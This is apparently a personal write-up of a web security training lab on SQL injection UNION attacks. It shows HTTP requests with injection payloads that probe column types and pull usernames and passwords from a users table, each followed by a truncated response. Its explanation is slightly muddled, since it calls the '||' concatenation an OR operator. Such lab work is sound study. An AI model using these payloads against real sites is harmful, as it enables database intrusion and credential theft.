# SQL injection UNION attack, retrieving multiple values in a single column

### I tested there are exactly two columns by placing NULL , and checked which column is string , and placed a string value in first column but got `500` status code but then placed `1` at that place and got `200` status code , this means this column support integer data type.
**Request**
```http
GET /filter?category=Tech+gifts'+UNION+SELECT+NULL,'A'-- HTTP/2
Host: 0a4400cd04bc271c81aba75500f40036.web-security-academy.net
Cookie: session=[REDACTED]
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a4400cd04bc271c81aba75500f40036.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

**Response**
```html
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 4983

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>SQL injection UNION attack, retrieving multiple values in a single column</title>
    </head>
    [...remaining are omitted...]
```

---
### So as here the lab told to retrieve data for username and password , I used string concatenation `~` to connect both columns with a OR operator .
```http
GET /filter?category=Tech+gifts'+UNION+SELECT+NULL,username||'~'||password+FROM+users-- HTTP/2
Host: 0a4400cd04bc271c81aba75500f40036.web-security-academy.net
Cookie: session=[REDACTED]
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a4400cd04bc271c81aba75500f40036.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

```html
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 5295

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>SQL injection UNION attack, retrieving multiple values in a single column</title>
    </head>
    [...remaining are omitted...]
```






